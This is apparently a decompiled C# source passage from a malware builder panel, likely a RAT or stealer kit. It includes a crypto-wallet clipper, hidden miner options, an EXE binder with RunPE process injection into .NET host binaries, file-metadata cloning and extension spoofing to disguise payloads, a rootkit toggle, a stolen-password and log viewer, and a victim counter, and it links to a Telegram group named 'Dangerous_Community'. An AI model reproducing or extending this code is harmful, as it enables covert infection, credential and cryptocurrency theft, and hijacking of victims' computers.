			Enable_Proxy.Enabled = false;
			Enable_Proxy.Checked = false;
			CPU.Enabled = false;
			AMD.Enabled = false;
			NVIDIA.Enabled = false;
			MMinings.Enabled = false;
			MMinings.Checked = false;
		}
	}

	public void method_107(object sender, EventArgs e)
	{
		if (Grabber.Checked)
		{
			BTC.Enabled = true;
			ETH.Enabled = true;
			GXMR.Enabled = true;
			XLM.Enabled = true;
			LTC.Enabled = true;
			XRP.Enabled = true;
			NEC.Enabled = true;
			MBRBZ.Enabled = true;
		}
		else
		{
			BTC.Enabled = false;
			ETH.Enabled = false;
			GXMR.Enabled = false;
			XLM.Enabled = false;
			LTC.Enabled = false;
			XRP.Enabled = false;
			NEC.Enabled = false;
			MBRBZ.Enabled = false;
			MBRBZ.Checked = false;
		}
	}

	public void method_108(object sender, EventArgs e)
	{
		if (!Enable_Proxy.Checked)
		{
			Proxy_Host.Enabled = false;
			Proxy_Port.Enabled = false;
		}
		else
		{
			Proxy_Host.Enabled = true;
			Proxy_Port.Enabled = true;
		}
	}

	public void method_109(object sender, EventArgs e)
	{
		try
		{
			if (Binder_ComboBox1.SelectedIndex == 0)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				OpenFileDialog openFileDialog2 = openFileDialog;
				openFileDialog2.Title = "Select EXE File";
				openFileDialog2.Filter = "(*.exe)|*.exe";
				openFileDialog2.ShowDialog();
				string fileName = openFileDialog.FileName;
				Binder_Path.Text = openFileDialog.FileName;
				Binder_name = Path.GetFileNameWithoutExtension(fileName) + ".exe";
				Binder_Byte = File.ReadAllBytes(fileName);
			}
			else if (Binder_ComboBox1.SelectedIndex == 1)
			{
				string text = Interaction.InputBox("Add a direct link to the executable file .", "Enter Direct link", "", 1);
				if (text.Length > 0)
				{
					Binder_Path.Text = text;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_110(object sender, EventArgs e)
	{
		if (!Enable_Binder.Checked)
		{
			Binder_ComboBox1.Enabled = false;
			RunPE.Enabled = false;
			Loading.Enabled = false;
			Binder_Path.Enabled = false;
			Binder_Run.Enabled = false;
		}
		else
		{
			Binder_ComboBox1.Enabled = true;
			RunPE.Enabled = true;
			Loading.Enabled = true;
			Binder_Path.Enabled = true;
			Binder_Run.Enabled = true;
		}
	}

	public void method_111(object sender, EventArgs e)
	{
		if (Binder_ComboBox1.SelectedIndex == 0)
		{
			Binder_Path.PlaceholderText = "Path";
		}
		else if (Binder_ComboBox1.SelectedIndex == 1)
		{
			Binder_Path.PlaceholderText = "Direct link";
		}
	}

	public void method_112(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "(.exe) |*.exe"
			};
			openFileDialog.ShowDialog();
			if (openFileDialog.FileName.Length > 0)
			{
				FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
				As1.Text = Path.GetFileNameWithoutExtension(openFileDialog.FileName);
				As2.Text = versionInfo.FileDescription;
				As3.Text = versionInfo.CompanyName;
				As4.Text = versionInfo.ProductName;
				As5.Text = versionInfo.LegalCopyright;
				string[] array = versionInfo.ProductVersion.Split('.');
				num1.Value = Conversions.ToDecimal(array[0]);
				num2.Value = Conversions.ToDecimal(array[1]);
				num3.Value = Conversions.ToDecimal(array[2]);
				num4.Value = Conversions.ToDecimal(array[3]);
				versionInfo.FileVersion.Split('.');
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_113(object sender, EventArgs e)
	{
		As1.Text = GENRan(12, 55);
		As2.Text = GENRan(5, 44);
		As3.Text = GENRan(12, 50);
		As4.Text = GENRan(12, 88);
		As5.Text = GENRan(12, 93);
		num1.Value = Conversions.ToDecimal(RN());
		num2.Value = Conversions.ToDecimal(RN());
		num3.Value = Conversions.ToDecimal(RN());
		num4.Value = Conversions.ToDecimal(RN());
	}

	public object RN()
	{
		VBMath.Randomize();
		float num = Conversion.Int(9f * VBMath.Rnd()) + 1f;
		return num;
	}

	public string GENRan(int num, int F)
	{
		string text = "012345678WERTYUIQWERTYUIWPL123456789KJHGFDSAZXC123456789VBNMQWERTY9QWERTYUIQWERTYUIOPLKJHGF123456789DSAZXCVBNMQWERTYUIOPLKJH123456789GFDSAZXCVBNMQWERTYUI123456789OPLKJHGFDSAYUIOPLKJHGFDSAZX123456789123456789123456789CVBNMOPLKJHGFDSAZXCVBNM";
		Random random = new Random();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i <= num; i++)
		{
			int startIndex = random.Next(0, F);
			stringBuilder.Append(text.Substring(startIndex, 1));
		}
		return stringBuilder.ToString();
	}

	public void method_114(object sender, EventArgs e)
	{
		if (Guna2ToggleSwitch2.Checked)
		{
			Clone_F.Enabled = true;
			As1.Enabled = true;
			As2.Enabled = true;
			As3.Enabled = true;
			As4.Enabled = true;
			As5.Enabled = true;
			num1.Enabled = true;
			num2.Enabled = true;
			num3.Enabled = true;
			num4.Enabled = true;
			GeRan.Enabled = true;
		}
		else
		{
			Clone_F.Enabled = false;
			As1.Enabled = false;
			As2.Enabled = false;
			As3.Enabled = false;
			As4.Enabled = false;
			As5.Enabled = false;
			num1.Enabled = false;
			num2.Enabled = false;
			num3.Enabled = false;
			num4.Enabled = false;
			GeRan.Enabled = false;
		}
	}

	public void method_115(object sender, EventArgs e)
	{
	}

	public void method_116(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "Icon |*.ico";
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				PictureBox_icon.ImageLocation = null;
				Path_icon.Text = "";
			}
			else
			{
				Path_icon.Text = openFileDialog.FileName;
				PictureBox_icon.ImageLocation = openFileDialog.FileName;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox(ex2.Message, MsgBoxStyle.Critical);
			ProjectData.ClearProjectError();
		}
	}

	public void method_117(object sender, EventArgs e)
	{
		if (!Enable_icon.Checked)
		{
			PictureBox_icon.Image = null;
			Path_icon.Text = "";
			PictureBox_icon.Enabled = false;
			Add_icon.Enabled = false;
			Path_icon.Enabled = false;
		}
		else
		{
			PictureBox_icon.Enabled = true;
			Add_icon.Enabled = true;
			Path_icon.Enabled = true;
		}
	}

	public void method_118(object sender, EventArgs e)
	{
		try
		{
			foreach (ListViewItem selectedItem in List_pass.SelectedItems)
			{
				numx = Conversions.ToString(selectedItem.Index);
			}
			if (List_pass.SelectedItems[0].SubItems[0].Text.Length > 0)
			{
				Pas_user = List_pass.SelectedItems[0].SubItems[0].Text;
			}
			if (List_pass.SelectedItems[0].SubItems[1].Text.Length > 0)
			{
				Pas_os = List_pass.SelectedItems[0].SubItems[1].Text;
			}
			Class2.XTBfo6WOm.Pass_View.ShowDialog();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_119(object sender, EventArgs e)
	{
	}

	public void method_120(object sender, EventArgs e)
	{
		pnlNav.Height = Button8.Height;
		pnlNav.Top = Button8.Top;
		Button8.BackColor = Color.FromArgb(46, 51, 73);
		TabControl1.SelectedTab = Grabberff;
		NOTF_BRBS1.Hide();
	}

	public void RnEsVdReuu(object sender, EventArgs e)
	{
		try
		{
			string value = null;
			string text = null;
			foreach (ListViewItem selectedItem in Logisx.SelectedItems)
			{
				value = Conversions.ToString(selectedItem.Index);
			}
			text = Class7.list_4[Conversions.ToInteger(value)];
			if (vmethod_129().ShowDialog() == DialogResult.OK)
			{
				File.WriteAllText(vmethod_129().FileName, text);
				Interaction.MsgBox(vmethod_129().FileName);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string NETFREM()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string result = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 211:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							case 0:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 4:
							goto IL_0037;
						case 6:
							goto IL_0043;
						case 8:
							goto IL_004f;
						case 10:
							goto IL_005b;
						case 12:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
						case 5:
						case 7:
						case 9:
						case 11:
						case 13:
						case 14:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0037:
					num = 4;
					result = "v4.0";
					goto end_IL_0000_3;
					IL_0043:
					num = 6;
					result = "v4.0";
					goto end_IL_0000_3;
					IL_000a:
					num = 2;
					switch (NETFRAMWORKS.SelectedIndex)
					{
					case 0:
						break;
					case 1:
						goto IL_0043;
					case 2:
						goto IL_004f;
					case 3:
						goto IL_005b;
					case 4:
						goto end_IL_0000_2;
					default:
						goto end_IL_0000_3;
					}
					goto IL_0037;
					IL_005b:
					num = 10;
					result = "v4.0";
					goto end_IL_0000_3;
					IL_004f:
					num = 8;
					result = "v4.0";
					goto end_IL_0000_3;
					end_IL_0000_2:
					break;
				}
				num = 12;
				result = "v4.0";
				break;
				end_IL_0000:;
			}
            catch when (obj is Exception exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError(exception);
				try0000_dispatch = 211;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public string INJECTOR()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string result = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 244:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0000;
							case 0:
								goto end_IL_0000;
							case 1:
								break;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 4:
							goto IL_0037;
						case 6:
							goto IL_004c;
						case 8:
							goto IL_0061;
						case 10:
							goto IL_0076;
						case 12:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 0:
							goto end_IL_0000;
						case 3:
						case 5:
						case 7:
						case 9:
						case 11:
						case 13:
						case 14:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0037:
					num = 4;
					text = "        S400.injRun(\"\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe\", String.Empty, b, True)";
					result = Class6.smethod_7(ref text);
					goto end_IL_0000_3;
					IL_004c:
					num = 6;
					text = "        S400.injRun(\"\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\", String.Empty, b, True)";
					result = Class6.smethod_7(ref text);
					goto end_IL_0000_3;
					IL_000a:
					num = 2;
					switch (Guna2ComboBox1.SelectedIndex)
					{
					case 0:
						break;
					case 1:
						goto IL_004c;
					case 2:
						goto IL_0061;
					case 3:
						goto IL_0076;
					case 4:
						goto end_IL_0000_2;
					default:
						goto end_IL_0000_3;
					}
					goto IL_0037;
					IL_0076:
					num = 10;
					text = "        S400.injRun(\"\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe\", String.Empty, b, True)";
					result = Class6.smethod_7(ref text);
					goto end_IL_0000_3;
					IL_0061:
					num = 8;
					text = "        S400.injRun(\"\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe\", String.Empty, b, True)";
					result = Class6.smethod_7(ref text);
					goto end_IL_0000_3;
					end_IL_0000_2:
					break;
				}
				num = 12;
				text = "        S400.injRun(\"\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe\", String.Empty, b, True)";
				result = Class6.smethod_7(ref text);
				break;
				end_IL_0000:;
			}
			catch  when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 244;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public string EXEC()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string result = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 191:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0000;
							case 1:
								break;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 5:
							goto IL_001d;
						case 8:
							goto IL_002d;
						case 9:
							goto IL_003d;
						case 11:
							goto IL_004a;
						case 14:
							goto IL_005b;
						case 17:
							goto IL_006c;
						case 18:
							goto IL_007d;
						case 15:
							goto IL_008a;
						case 12:
							goto IL_0097;
						case 6:
							goto IL_00a4;
						case 3:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
						case 7:
						case 10:
						case 13:
						case 16:
						case 19:
						case 20:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00a4:
					num = 6;
					result = "COM|*.com";
					goto end_IL_0000_3;
					IL_0097:
					num = 12;
					result = "PIF|*.pif";
					goto end_IL_0000_3;
					IL_000a:
					num = 2;
					if (EXE.Checked)
					{
						break;
					}
					goto IL_001d;
					IL_001d:
					num = 5;
					if (!COM.Checked)
					{
						goto IL_002d;
					}
					goto IL_00a4;
					IL_002d:
					num = 8;
					if (SCR.Checked)
					{
						goto IL_003d;
					}
					goto IL_004a;
					IL_003d:
					num = 9;
					result = "SCR|*.scr";
					goto end_IL_0000_3;
					IL_004a:
					num = 11;
					if (!PIF.Checked)
					{
						goto IL_005b;
					}
					goto IL_0097;
					IL_005b:
					num = 14;
					if (!BAT.Checked)
					{
						goto IL_006c;
					}
					goto IL_008a;
					IL_006c:
					num = 17;
					if (!CMD.Checked)
					{
						goto end_IL_0000_3;
					}
					goto IL_007d;
					IL_007d:
					num = 18;
					result = "CMD|*.cmd";
					goto end_IL_0000_3;
					IL_008a:
					num = 15;
					result = "BAT|*.bat";
					goto end_IL_0000_3;
					end_IL_0000_2:
					break;
				}
				num = 3;
				result = "EXE|*.exe";
				break;
				end_IL_0000:;
			}
			catch  when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 191;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public string EXEC11()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string result = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 289:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001a;
						case 5:
							goto IL_0029;
						case 8:
							goto IL_0039;
						case 11:
							goto IL_0049;
						case 12:
							goto IL_005a;
						case 14:
							goto IL_0067;
						case 17:
							goto IL_0078;
						case 18:
							goto IL_0089;
						case 15:
							goto IL_0096;
						case 9:
							goto IL_00a3;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
						case 7:
						case 10:
						case 13:
						case 16:
						case 19:
						case 20:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00a3:
					num = 9;
					result = "scr";
					goto end_IL_0000_3;
					IL_0096:
					num = 15;
					result = "bat";
					goto end_IL_0000_3;
					IL_000a:
					num = 2;
					if (EXE.Checked)
					{
						goto IL_001a;
					}
					goto IL_0029;
					IL_001a:
					num = 3;
					result = "exe";
					goto end_IL_0000_3;
					IL_0029:
					num = 5;
					if (COM.Checked)
					{
						break;
					}
					goto IL_0039;
					IL_0039:
					num = 8;
					if (!SCR.Checked)
					{
						goto IL_0049;
					}
					goto IL_00a3;
					IL_0049:
					num = 11;
					if (PIF.Checked)
					{
						goto IL_005a;
					}
					goto IL_0067;
					IL_005a:
					num = 12;
					result = "pif";
					goto end_IL_0000_3;
					IL_0067:
					num = 14;
					if (!BAT.Checked)
					{
						goto IL_0078;
					}
					goto IL_0096;
					IL_0078:
					num = 17;
					if (!CMD.Checked)
					{
						goto end_IL_0000_3;
					}
					goto IL_0089;
					IL_0089:
					num = 18;
					result = "cmd";
					goto end_IL_0000_3;
					end_IL_0000_2:
					break;
				}
				num = 6;
				result = "com";
				break;
				end_IL_0000:;
			}
			catch  when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 289;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public void method_121(object sender, PaintEventArgs e)
	{
	}

	public void oiusyiCdal(object sender, EventArgs e)
	{
		if (Rotk.Checked)
		{
			if (NETFRAMWORKS.StartIndex == 0)
			{
				NETFRAMWORKS.StartIndex = 3;
				Interaction.MsgBox("Rootkit Works Only in Net framework 4.0 - 4.5", MsgBoxStyle.Exclamation, "Sorry");
			}
			if (NETFRAMWORKS.StartIndex == 1)
			{
				NETFRAMWORKS.StartIndex = 3;
				Interaction.MsgBox("Rootkit Works Only in Net framework 4.0 - 4.5", MsgBoxStyle.Exclamation, "Sorry");
			}
			if (NETFRAMWORKS.StartIndex == 2)
			{
				NETFRAMWORKS.StartIndex = 3;
				Interaction.MsgBox("Rootkit Works Only in Net framework 4.0 - 4.5", MsgBoxStyle.Exclamation, "Sorry");
			}
		}
	}

	public void method_122(object sender, EventArgs e)
	{
		pnlNav.Height = Button9.Height;
		pnlNav.Top = Button9.Top;
		Button9.BackColor = Color.FromArgb(46, 51, 73);
		TabControl1.SelectedTab = Logs;
		NOTF_COK.Hide();
	}

	public void method_123(object sender, EventArgs e)
	{
		if (!ZIS.Checked)
		{
			Nu.Enabled = false;
			KB.Enabled = false;
			MB.Enabled = false;
			GB.Enabled = false;
		}
		else
		{
			Nu.Enabled = true;
			KB.Enabled = true;
			MB.Enabled = true;
			GB.Enabled = true;
		}
	}

	public void method_124(object sender, EventArgs e)
	{
		if (!SPOFFING.Checked)
		{
			TXT_SPOOFING.Enabled = false;
		}
		else
		{
			TXT_SPOOFING.Enabled = true;
		}
	}

	public void method_125(object sender, EventArgs e)
	{
		pnlNav.Height = Button10.Height;
		pnlNav.Top = Button10.Top;
		Button10.BackColor = Color.FromArgb(46, 51, 73);
		TabControl1.SelectedTab = Settings;
	}

	public void method_126(object sender, EventArgs e)
	{
		Button8.BackColor = Color.FromArgb(24, 30, 54);
	}

	public void method_127(object sender, EventArgs e)
	{
		Button9.BackColor = Color.FromArgb(24, 30, 54);
	}

	public void method_128(object sender, EventArgs e)
	{
		Button10.BackColor = Color.FromArgb(24, 30, 54);
	}

	public void method_129(object sender, EventArgs e)
	{
		Button4.BackColor = Color.FromArgb(46, 51, 73);
		Button2.BackColor = Color.FromArgb(37, 42, 64);
		Button1.BackColor = Color.FromArgb(37, 42, 64);
		Button3.BackColor = Color.FromArgb(37, 42, 64);
		Button5.BackColor = Color.FromArgb(37, 42, 64);
		Button6.BackColor = Color.FromArgb(37, 42, 64);
		Button7.BackColor = Color.FromArgb(37, 42, 64);
		TabControl2.SelectedTab = TabPage6;
	}

	public void method_130(object sender, EventArgs e)
	{
		Button5.BackColor = Color.FromArgb(46, 51, 73);
		Button2.BackColor = Color.FromArgb(37, 42, 64);
		Button1.BackColor = Color.FromArgb(37, 42, 64);
		Button4.BackColor = Color.FromArgb(37, 42, 64);
		Button3.BackColor = Color.FromArgb(37, 42, 64);
		Button6.BackColor = Color.FromArgb(37, 42, 64);
		Button7.BackColor = Color.FromArgb(37, 42, 64);
		TabControl2.SelectedTab = TabPage8;
	}

	public void method_131(object sender, EventArgs e)
	{
		Button6.BackColor = Color.FromArgb(46, 51, 73);
		Button2.BackColor = Color.FromArgb(37, 42, 64);
		Button1.BackColor = Color.FromArgb(37, 42, 64);
		Button4.BackColor = Color.FromArgb(37, 42, 64);
		Button3.BackColor = Color.FromArgb(37, 42, 64);
		Button5.BackColor = Color.FromArgb(37, 42, 64);
		Button7.BackColor = Color.FromArgb(37, 42, 64);
		TabControl2.SelectedTab = TabPage9;
	}

	public void method_132(object sender, EventArgs e)
	{
		Button7.BackColor = Color.FromArgb(46, 51, 73);
		Button2.BackColor = Color.FromArgb(37, 42, 64);
		Button1.BackColor = Color.FromArgb(37, 42, 64);
		Button4.BackColor = Color.FromArgb(37, 42, 64);
		Button3.BackColor = Color.FromArgb(37, 42, 64);
		Button5.BackColor = Color.FromArgb(37, 42, 64);
		Button6.BackColor = Color.FromArgb(37, 42, 64);
		TabControl2.SelectedTab = TabPage3;
	}

	public void QvYsnPtmw6(object sender, EventArgs e)
	{
	}

	public void method_133(object sender, EventArgs e)
	{
	}

	public static bool CheckInternetConnection()
	{
		bool result;
		try
		{
			result = Class2.GKfRhcGxM.Network.Ping("www.google.com");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public void St(int num)
	{
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		while (stopwatch.ElapsedMilliseconds < num)
		{
			Application.DoEvents();
		}
		stopwatch.Stop();
	}

	public void method_134(object sender, EventArgs e)
	{
	}

	public void method_135(object sender, EventArgs e)
	{
		Process.Start("https://www.youtube.com/channel/UCGspq_VE3bBEm7RBWcfDu2A");
	}

	public void method_136(object sender, EventArgs e)
	{
		Process.Start("https://t.me/Dangerous_Community");
	}

	public void method_137(object sender, EventArgs e)
	{
		USS.Value = Conversions.ToInteger(Conversions.ToString(L1.RowCount));
		Onl.Text = Conversions.ToString(L1.RowCount) + " Online";
		CO.Text = Conversions.ToString(L1.RowCount) + " V+";
		Sel.Text = Conversions.ToString(L1.SelectedRows.Count) + " PC+";
	}

	public void method_138(object sender, EventArgs e)
	{
	}

	public void method_139(object sender, EventArgs e)
	{
		if (Encrypt.Checked)
		{
			Guna2ComboBox1.Enabled = true;
		}
		else
		{
			Guna2ComboBox1.Enabled = false;
		}
	}

    public void InitializeComponent()
    {
            this.SuspendLayout();
            // 
            // Form1
            // 
            this.ClientSize = new System.Drawing.Size(323, 261);
            this.Name = "Form1";
            this.ResumeLayout(false);

    }
}
